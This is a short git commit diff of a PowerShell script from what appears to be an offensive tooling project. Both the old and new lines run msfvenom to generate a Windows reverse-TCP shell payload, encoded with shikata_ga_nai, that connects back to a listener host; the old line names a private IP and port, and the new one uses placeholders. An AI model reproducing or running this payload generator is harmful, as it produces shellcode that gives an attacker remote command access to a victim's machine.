9e86e7e5fa968ae64530b9052a25a68423bcd55d
Sizerino <myultisreadylol@gmail.com>
2024-06-25 19:14:24 +0300

    Updated msfvenomcmd.ps1

--- Client-Side/scripts/msfvenomcmd.ps1
+++ Client-Side/scripts/msfvenomcmd.ps1
@@ -1,3 +1,3 @@
 Write-Host "Generating Reverse-Shell Payload..."
 
-.\external-tools\Custom-Compacted-MSF\bin\msfvenom.bat -p windows/shell_reverse_tcp LHOST=192.168.31.129 LPORT=9999 -b '\x00' -e x86/shikata_ga_nai -f py -o .\scripts\payload.txt
+.\external-tools\Custom-Compacted-MSF\bin\msfvenom.bat -p windows/shell_reverse_tcp LHOST=[] LPORT={} -b '\x00' -e x86/shikata_ga_nai -f python -o .\scripts\shellcode.txt
